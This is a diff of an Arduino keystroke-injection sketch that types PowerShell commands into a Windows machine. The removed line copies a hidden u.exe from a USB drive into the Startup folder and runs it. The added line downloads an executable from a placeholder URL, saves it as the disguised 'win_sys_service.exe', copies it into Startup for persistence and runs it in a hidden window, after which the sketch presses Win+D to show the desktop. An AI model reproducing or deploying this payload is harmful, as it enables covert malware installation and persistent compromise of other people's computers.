@@ -11,9 +11,9 @@ void setup() {
   delay(50);
   Keyboard.press(KEY_RETURN);
   delay(10);
-  Keyboard.release(KEY_RETURN);
+  Keyboard.release(KEY_RETURN); 
   delay(1000);
-  Keyboard.print("powershell.exe -Command \"cd \\\"C:/users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\\\";$ProgressPreference=\\\"SilentlyContinue\\\"; xcopy E:/tpt/lora/u.exe -o u.exe;attrib +h u.exe;./u.exe\"&&exit\n");
+  Keyboard.print("powershell.exe -Command \"$url=\\\"<url_exe_da_iniettare>\\\";$out=\\\"$env:APPDATA\\win_sys_service.exe\\\";$startup=\\\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win_sys_service.exe\\\";$ProgressPreference=\\\"SilentlyContinue\\\";(New-Object System.Net.WebClient).DownloadFile($url,$out);if(-not(Test-Path $startup)){Copy-Item $out $startup};Start-Process $out -WindowStyle Hidden\"&&exit\n");
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('d');
   Keyboard.releaseAll();
